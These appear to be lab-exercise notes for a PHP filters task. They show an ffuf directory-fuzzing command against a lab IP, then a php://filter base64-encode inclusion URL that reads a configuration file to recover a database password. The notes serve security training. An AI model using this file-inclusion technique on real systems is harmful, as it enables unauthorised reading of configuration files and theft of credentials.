# [PHP Filters](PHP%20Filters.md)
### Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

```shell
ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://154.57.164.65:30422/FUZZ.php
```
![](Screenshot%202026-06-30%20at%2015.17.37.png)

```url
http://154.57.164.65:30422/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```
![](Screenshot%202026-06-30%20at%2015.17.59.png)
![](Screenshot%202026-06-30%20at%2015.18.54.png)
